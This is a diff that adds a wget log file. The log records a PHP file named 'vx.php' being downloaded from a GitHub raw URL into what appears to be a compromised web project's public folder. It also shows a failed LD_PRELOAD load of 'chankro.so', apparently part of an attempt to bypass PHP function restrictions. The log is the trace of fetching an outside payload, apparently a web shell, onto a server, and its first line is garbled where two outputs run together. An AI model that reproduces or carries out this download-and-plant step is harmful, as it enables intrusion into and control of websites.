@@ -1,0 +1,12 @@
+--2026-02-24 09:03:33--  https://raw.githubusercontent.com/bleachchan/lufyytaro/refs/headsERROR: ld.so: object '/home/posr7946/project/public/chankro.so' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
+--2026-02-24 09:03:33--  https://raw.githubusercontent.com/bleachchan/lufyytaro/refs/heads/main/vx.txt
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1585 (1.5K) [text/plain]
+Saving to: 'vx.php'
+
+     0K .                                                     100% 21.8M=0s
+
+2026-02-24 09:03:34 (21.8 MB/s) - 'vx.php' saved [1585/1585]
+
